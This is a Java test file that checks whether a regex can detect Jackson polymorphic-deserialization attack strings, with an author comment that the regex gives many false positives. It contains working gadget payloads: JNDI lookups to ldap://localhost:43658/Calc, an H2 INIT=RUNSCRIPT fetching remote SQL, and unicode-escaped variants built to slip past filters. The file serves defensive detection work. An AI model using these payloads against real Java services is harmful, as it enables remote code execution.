package com.threedr3am.bug.feature;

import java.util.regex.Pattern;

/**
 *
 * Jackson defaultType序列化数据特征
 *
 * @author threedr3am
 */
public class JacksonSerialization {

  /**
   * 误报严重，感觉不能用正则去拦
   */
  static Pattern pattern = Pattern.compile("\\[(.|\\n)*?[\"'][\\w\\.$\\\\]+?[\"'](.|\\n)*?,(.|\\n)*?(\\{(((.|\\n)*?[\"'][\\w\\.$\\\\]+?[\"'](.|\\n)*?:(.|\\n)*?[\"'])*?(.|\\n)*?\\})|([\"'](.|\\n)*?[\"'])(.|\\n)*?\\])");

  public static void main(String[] args) {
//    String json = "[\"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\", {\"properties\": {\"UserTransaction\":\"ldap://localhost:43658/Calc\"}}]";
//    String json = "[   \n\r\t\n#\n\'com.ibatis.sq\\u006c\\u006dap.engine.transaction.jta.JtaTransactionConfig\', {\"pro\\u0070\\u0065\\u0072ties\": {\"\\u0055serTransaction\":\"\\u006cdap://local\\u0068\\u006fst:43658/Calc\"}}]";
    printAndMatch("[   \n\n\t\n //adakdbajbda\n /*adkankandaadnad*/ #ajndajdnak\n'com.ibatis.sq\\u006c\\u006dap.engine.transaction.jta.JtaTran\\u0073\\u0061\\u0063tionConfig', {\"pro\\u0070\\u0065\\u0072ties\": {\"\\u0055serTransaction\":\"\\u006cdap://local\\u0068\\u006fst:43658/Calc\"}}]");
    printAndMatch("[\"net.sf.ehcache.transaction.manager.DefaultTransactionManagerLookup\"," +
        "{\"properties\":{\"jndiName\":\"ldap://localhost:43658/Calc\"}}]");
    printAndMatch("[\"ch.qos.logback.core.db.DriverManagerConnectionSource\", " +
        "{\"url\":\"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://localhost:80/inject.sql'\"}]");
    printAndMatch("[\"com.zaxxer.hikari.HikariConfig\", {\"metricRegistry\":\"ldap://localhost:43658/Calc\"}]");
    printAndMatch("[   \"org.apache.xbean.propertyeditor.JndiConverter\", {\"asText\":\"ldap://localhost:43658/Calc\"}]");
    printAndMatch("[\"ch.qos.logback.core.db.JNDIConnectionSource\",{\"jndiLocation\":\"ldap://localhost:43658/Calc\"}]");
    printAndMatch("[  \"com.mysql.cj.jdbc.admin.MiniAdmin\"  , \"jdbc:mysql://127.0.0.1:3306/\"]");
  }

  private static void printAndMatch(String json) {
    System.out.println("------------------------------------------------------------");
    System.out.println(json);
    System.out.println(pattern.matcher(json).find());
  }

}
